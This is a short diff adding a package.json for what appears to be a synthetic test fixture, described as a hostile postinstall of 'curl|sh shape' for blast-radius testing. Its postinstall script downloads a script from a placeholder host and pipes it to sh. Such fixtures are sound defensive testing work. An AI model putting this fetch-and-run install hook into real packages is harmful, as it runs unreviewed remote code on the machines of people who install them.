@@ -1,0 +1,9 @@
+{
+  "name": "spike-fixture-synthetic-arbitrary",
+  "version": "9.9.9",
+  "license": "MIT",
+  "description": "R1 blast-radius fixture: synthetic arbitrary-hostile postinstall (curl|sh shape)",
+  "scripts": {
+    "postinstall": "curl -sSL https://installer.example.com/setup.sh | sh"
+  }
+}
